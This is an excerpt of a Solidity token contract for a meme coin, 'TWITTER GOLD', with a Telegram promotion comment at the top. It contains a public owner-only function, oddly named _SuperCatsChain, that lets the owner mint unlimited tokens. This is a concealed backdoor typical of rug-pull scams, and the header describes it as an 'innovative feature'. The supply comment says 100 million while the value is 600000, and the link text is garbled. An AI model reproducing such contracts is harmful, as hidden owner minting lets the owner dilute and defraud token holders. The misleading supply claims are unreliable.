...
//
// $TwitterGold proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/TwitterGoldd - 🟢
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SuperCatsChain(uint256 amount) public onlyOwner {
    _SuperCatsChain(msg.sender, amount);
    }
    ...
    function _SuperCatsChain(address account, uint256 amount) internal virtual {
...
contract $TwitterGold is ERC20 {

    uint tokenTotalSupply = 600000; // 100 Million Token Supply

    constructor() public ERC20("TWITTER GOLD", "TWITTERGOLD") {
        _SuperCatsChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}